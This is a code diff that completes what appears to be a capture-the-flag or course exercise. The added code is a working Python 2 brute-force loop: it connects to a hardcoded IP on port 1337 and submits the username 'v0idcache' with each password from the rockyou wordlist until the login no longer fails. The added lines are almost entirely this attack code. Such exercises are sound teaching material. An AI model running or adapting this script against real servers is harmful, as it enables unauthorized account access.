@@ -27,39 +27,43 @@
 import socket
 
 host = "142.93.136.81" # IP address here
-port = 22 # Port here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
-def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+def brute_force(fleming):
+        username = "v0idcache" # Hint: use OSINT
+    
+        # Sockets: https://docs.python.org/2/library/socket.html
+        # How to use the socket s:
+    
+        # Establish socket connection
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+        # Reading:
+        data = s.recv(1024) # Receives 1024 bytes from IP/Port
+        print(data + "\t" + username) # Prints data
 
-            Reading:
+        # Sending:
+        s.send(username + "\n")
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+        data = s.recv(1024)
+        print(data + "\t" + fleming)
 
-            Sending:
+        # Send a newline \n at the end of your command
+        s.send(fleming + "\n")
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
+        # General idea:
 
-        General idea:
+        # Given that you know a potential username, use a wordlist and iterate
+        # through each possible password and repeatedly attempt to login to
+        # v0idcache's server.
 
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            v0idcache's server.
-    """
+        #password = fleming # Hint: use wordlist
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-
-
-
+        return s.recv(1024)
 
 if __name__ == '__main__':
-    brute_force()
+    for fleming in open(wordlist):
+        if brute_force(fleming) != "Fail\n":
+            break
